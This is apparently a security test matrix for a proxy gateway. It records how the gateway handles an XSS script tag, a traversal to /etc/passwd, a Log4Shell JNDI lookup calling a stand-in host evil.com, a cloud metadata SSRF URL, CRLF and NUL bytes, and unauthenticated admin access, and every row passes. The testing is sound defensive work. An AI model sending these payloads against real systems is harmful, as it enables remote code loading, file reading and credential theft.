|---|---|---|---|---|
| `<script>alert(1)</script>` | GET param | `suspicious-path` / no XSS reflection | no reflection + CRLF-rejected | PASS |

| `../../../../etc/passwd` | URL path | `suspicious-path` | `suspicious-path` | PASS |
| `${jndi:ldap://evil.com/a}` | header | `ai-headers-incomplete` + logged | logged | PASS |
| `http://169.254.169.254/` | GET param | proxied (BODY_PATTERN_MATCH=0) | proxied | PASS |
| `\r\n` in path (CRLF) | URL | HTTP 400 | 400 | PASS |
| `%00` NUL in path | URL | HTTP 400 | 400 | PASS |
| Admin endpoint without session | `/secured/control-center` | stealth 503 (upstream mirror) | 503 | PASS |
| XSS reflection check | URL | input not reflected unescaped | not reflected | PASS |

Notes: Gateway is a proxy, not a WAF. GET-parameter injection is not inspected by default (`BODY_PATTERN_MATCH=0`). Body scanner (`BODY_PATTERN_MATCH=1`) is opt-in for deployments requiring deep inspection. CRLF and NUL byte control chars rejected by aiohttp URL parser (400). Unauthenticated access to admin namespace silently served mirrored upstream error (stealth-deny pattern, not a redirect).
